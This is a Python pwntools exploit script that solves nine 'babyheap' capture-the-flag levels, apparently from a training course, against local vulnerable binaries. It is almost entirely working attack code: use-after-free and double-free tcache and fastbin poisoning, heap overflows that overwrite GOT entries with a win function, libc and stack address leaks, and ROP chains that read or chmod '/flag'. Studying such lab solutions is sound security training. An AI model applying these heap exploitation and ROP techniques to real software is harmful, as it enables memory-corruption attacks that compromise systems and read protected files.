#!/usr/bin/python3
from pwn import *
import os
import time
import re
import sys

CHALLENGE_NAME = f"./babyheap_level{os.getenv('HOSTNAME')[-1]}"
libc = ELF(f"./libc.so.6")
binary = ELF(CHALLENGE_NAME)

# challenge calls win if you change a global var to be 0xdeadbeef
# allows for a uaf
def challenge1():
    p = process([CHALLENGE_NAME], close_fds=False)
    info(p.clean())
    win_var = 0x4040F0
    # malloc a chunk
    p.sendline(b'1')
    p.sendline(b'8')
    p.sendline(b'')
    info(p.clean())
    # free the chunk
    p.sendline(b'3')
    p.sendline(b'0')
    info(p.clean())
    # edit the chunk to be win
    p.sendline(b'2')
    p.sendline(b'0')
    p.sendline(p64(win_var))
    # malloc the first chunk
    p.sendline(b'1')
    p.sendline(b'8')
    p.sendline(p64(win_var))
    info(p.clean())
    # malloc agin this one should point to win_var
    p.sendline(b'1')
    p.sendline(b'8')
    p.sendline(p64(0xdeadbeef))
    info(p.clean())
    # call win
    p.sendline(b'5')
    info(p.clean())
    input(f'PID {p.pid}')
    p.interactive()
    p.kill()  

def malloc(p, size, value=b""):
    p.sendline(b'1')
    p.sendline(f'{size}'.encode())
    p.sendline(value)
    p.clean()
    # info(p.clean())

def free(p, index):
    p.sendline(b'3')
    p.sendline(f'{index}'.encode())
    p.clean()
    # info(p.clean())

def edit(p, index, contents):
    p.sendline(b'2')
    p.sendline(f'{index}'.encode())
    p.sendline(contents)
    p.clean()

# use a double free vulnerability
# progam keeps track of what values are stored and not stored
def challenge2():
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    info(p.clean())
    # malloc twice
    malloc(p, 8)
    malloc(p, 8)
    # double free vulnerability
    free(p, 0)
    free(p, 1)
    free(p, 0)
    # malloc again
    malloc(p, 8)
    # edit this value now to add the win_var to the tcache
    edit(p, 0, p64(0x4040F0))
    # clear the tcache
    malloc(p, 8)
    malloc(p, 8)
    malloc(p, 8)
    # edit the win var to the correct value
    edit(p, 3, p64(0xdeadbeef))
    # get the flag
    p.sendline(b'5')
    info(p.clean())
    p.interactive()
    p.kill()      

# zeros out the ptr and checks if it is allocated
# so no double free or uaf
# need to do a heap overflow to call win
def challenge3():
    # 0x403ff0 - > libc_start_main
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    info(p.clean())
    # malloc twice then free twice
    malloc(p, 8)
    malloc(p, 8)
    free(p, 1)
    free(p, 0)
    # overflow attack to put the got address of exit into the tcache
    malloc(p, 8, value=(b'a'*32 + p64(binary.got.exit)))
    malloc(p, 8)
    # malloc here will be got.exit, overwrite it with win
    malloc(p, 8, value=p64(binary.symbols['win']))
    # call exit to win
    p.sendline(b'5')
    info(p.clean())
    p.interactive()
    p.kill()

# program does not null out or check if alloc has been freed
# so you can uaf or double free
# also the edit function is not implemented
def challenge4():
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    info(p.clean())
    # malloc twice
    malloc(p, 8)
    malloc(p, 8)
    # double free 
    free(p, 0)
    free(p, 1)
    free(p, 0)
    # edit is not implemented so you can only edit on malloc
    malloc(p, 8, value=(p64(binary.got.exit)))
    malloc(p, 8)
    malloc(p, 8)
    # overwrite got.exit with win address
    malloc(p, 8, value=p64(binary.symbols['win']))
    # exit to call win
    p.sendline(b'5')
    info(p.clean())
    p.interactive()
    p.kill()

# challenge allowed for heap overflow attacks
# no win function
# need to rop
def challenge5():
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    p.clean()
    # get the address of libc
    p.sendline(b'7')
    p.sendline(f'{0x403ff0}'.encode())
    p.readuntil(b'the value is: ')
    libcstart = int(p.readline().strip().decode(), 16)
    libc.address = libcstart - libc.symbols['__libc_start_main']
    # get the address of ld-2 which leads to a stack address
    loader = libc.address + 0x3f1000
    stack_leak_addr = loader + 0x227740
    # get a stack leak
    p.sendline(b'7')
    p.sendline(f'{stack_leak_addr}'.encode())
    p.readuntil(b'the value is: ')
    stack_leak = int(p.readline().strip().decode(), 16)
    add_chunk_rbp = stack_leak - 0x158
    print(hex(stack_leak))
    # malloc and free twice
    malloc(p, 8)
    malloc(p, 8)
    free(p, 1)
    free(p, 0)
    # overflow attack to put the rbp of add_chunk into the tcache
    malloc(p, 8, value=(b'a'*32 + p64(add_chunk_rbp)))
    malloc(p, 8)
    # make a rop chain
    rop = ROP(libc)
    rop.call('close', [3])
    rop.call('read', [0, libc.bss(0x123), 42])
    rop.call('open', [libc.bss(0x123), 0])
    rop.call('sendfile', [1, 3, 0, 1024])
    rop.call('exit', [42])
    # send the ropchain and get the flag
    payload = b'a'*8 + rop.chain()
    print(len(payload))
    malloc(p, 8, value=payload)
    p.send(b'/flag\0')
    info(p.clean())
    p.kill()

# need to rop in this challenge
# has checks to make sure you don't do tcache stuff
# same as 5 but uses the fastbins
def challenge6():
    p = process([CHALLENGE_NAME], close_fds=False)
    malloc_size = 120
    input(f'PID {p.pid}')
    # get libc base and the location of ld-2 for a stack address
    p.readuntil(b'Christmas gift: ')
    puts = int(p.readline().strip().decode(), 16)
    libc.address = puts - libc.symbols.puts
    loader = libc.address + 0x3f1000
    # input(f'libc {hex(libc.address)}\nld-2 {hex(loader)}')
    stack_leak_addr = loader + 0x227740
    # get the address of the return of 'read' within add_chunk
    p.sendline(b'7')
    p.sendline(f'{stack_leak_addr}'.encode())
    p.readuntil(b'the value is: ')
    stack_leak = int(p.readline().strip().decode(), 16)
    add_chunk_return = stack_leak - 0x1b8 - 0x10
    # fill up the tcache and add to the fastbins
    for i in range(9):
        malloc(p, malloc_size)

    for i in range(9):
        free(p, i)

    # add the rip of read to the tcache
    edit(p, 8, p64(add_chunk_return))
    # make a chmod ropchain
    rop = ROP(libc)
    rop.call('read', [0, libc.bss(0x123), 42])
    rop.call('chmod', [libc.bss(0x123), 0x1ff])
    payload = b'a'*24 + rop.chain()
    # clear the tcache
    for i in range(9):
        malloc(p, malloc_size)
    # this malloc will be the rip of read
    malloc(p, malloc_size, value=payload)
    # chmod the flag
    p.send(b'/flag\0')
    info(p.clean())
    p.kill()

# need to rop using fastbins double free
# no edit function implemented either
def challenge7():
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    # get the libc base
    malloc_size = 120
    p.readuntil(b'Christmas gift: ')
    puts = int(p.readline().strip().decode(), 16)
    libc.address = puts - libc.symbols.puts
    loader = libc.address + 0x3f1000
    input(f'libc {hex(libc.address)}\nld-2 {hex(loader)}')
    stack_leak_addr = loader + 0x227740
    # get the address of the return of 'read' within add_chunk
    p.sendline(b'7')
    p.sendline(f'{stack_leak_addr}'.encode())
    p.readuntil(b'the value is: ')
    stack_leak = int(p.readline().strip().decode(), 16)
    # add_chunk = 0x150
    # readn = 0x170
    # read = 0x1a0
    add_chunk_return = stack_leak - 0x1a8 - 0x10
    print(hex(add_chunk_return))
    # fill up the tcache and add to the fastbins
    for i in range(9):
        malloc(p, malloc_size)
    for i in range(9):
        free(p, i)
    # double free into the fastbins
    free(p, 7)
    # clear the tcache
    for i in range(7):
        malloc(p, malloc_size)
    # add the rip of 'read' into the fastbins
    malloc(p, malloc_size, value=(p64(add_chunk_return)))
    malloc(p, malloc_size)
    malloc(p, malloc_size)
    # make ropchain
    rop = ROP(libc)
    rop.call('read', [0, libc.bss(0x123), 42])
    rop.call('chmod', [libc.bss(0x123), 0x1ff])
    payload = b'a'*24 + rop.chain()
    # malloc to add the ropchain and chmod the flag
    malloc(p, malloc_size, value=payload)
    p.send(b'/flag\0')
    p.interactive()
    p.kill()

# need to rop using uaf in the fastbins
# allows you to edit after freeing
# compination of level5 and level7
def challenge8():
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    malloc_size = 120
    # get the address of libc
    p.sendline(b'7')
    p.sendline(f'{0x403ff0}'.encode())
    p.readuntil(b'the value is: ')
    libc.address = int(p.readline().strip().decode(), 16) - 0x21ab0
    loader = libc.address + 0x3f1000
    input(f'libc {hex(libc.address)}\nld-2 {hex(loader)}')
    stack_leak_addr = loader + 0x227740
    # get the address of the return of 'read' within add_chunk
    p.sendline(b'7')
    p.sendline(f'{stack_leak_addr}'.encode())
    p.readuntil(b'the value is: ')
    stack_leak = int(p.readline().strip().decode(), 16)
    # add_chunk = 0x150
    # readn = 0x170
    # read = 0x1a0
    add_chunk_return = stack_leak - 0x1a8 - 0x10
    print(hex(add_chunk_return))
    # fill up the tcache and add to the fastbins
    for i in range(9):
        malloc(p, malloc_size)

    for i in range(9):
        free(p, i)
    # add the rip of read to the tcache
    edit(p, 8, p64(add_chunk_return))
    # clear the tcache
    for i in range(8):
        malloc(p, malloc_size)
    # make ropchain
    rop = ROP(libc)
    rop.call('read', [0, libc.bss(0x123), 42])
    rop.call('chmod', [libc.bss(0x123), 0x1ff])
    payload = b'a'*8 + rop.chain()
    # malloc to add the ropchain and chmod the flag
    malloc(p, malloc_size, value=payload)
    p.send(b'/flag\0')
    info(p.clean())
    p.interactive()
    p.kill()

# doesn't give a libc leak so you need to get that the same as level8
# has a fastbin double free error so you need to do it the same as level7
def challenge9():
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    malloc_size = 120
    # get the address of libc
    p.sendline(b'7')
    p.sendline(f'{0x403ff0}'.encode())
    p.readuntil(b'the value is: ')
    libc.address = int(p.readline().strip().decode(), 16) - 0x21ab0
    loader = libc.address + 0x3f1000
    input(f'libc {hex(libc.address)}\nld-2 {hex(loader)}')
    stack_leak_addr = loader + 0x227740
    # get the address of the return of 'read' within add_chunk
    p.sendline(b'7')
    p.sendline(f'{stack_leak_addr}'.encode())
    p.readuntil(b'the value is: ')
    stack_leak = int(p.readline().strip().decode(), 16)
    # add_chunk = 0x150
    # readn = 0x170
    # read = 0x1a0
    add_chunk_return = stack_leak - 0x1a8 - 0x10
    print(hex(add_chunk_return))
    # fill up the tcache and add to the fastbins
    for i in range(9):
        malloc(p, malloc_size)
    for i in range(9):
        free(p, i)
    # double free into the fastbins
    free(p, 7)
    # clear the tcache
    for i in range(7):
        malloc(p, malloc_size)
    # add the rip of 'read' into the fastbins
    malloc(p, malloc_size, value=(p64(add_chunk_return)))
    malloc(p, malloc_size)
    malloc(p, malloc_size)
    # make ropchain
    rop = ROP(libc)
    rop.call('read', [0, libc.bss(0x123), 42])
    rop.call('chmod', [libc.bss(0x123), 0x1ff])
    payload = b'a'*24 + rop.chain()
    # malloc to add the ropchain and chmod the flag
    malloc(p, malloc_size, value=payload)
    p.send(b'/flag\0')
    info(p.clean())
    p.kill()

def main():
    context.arch = 'amd64'
    context.encoding ='latin'
    context.log_level = 'INFO'
    context.terminal = ["tmux", "splitw", "-h"]
    warnings.simplefilter('ignore')
    challenge9()

def challengeT():
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    info(p.clean())
    p.interactive()
    p.kill()

if __name__ == "__main__":
    main()


    

# with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *main+693
    # b *main+432
    # ''') as p:
    

# core = Coredump('./core')
# print(core)


    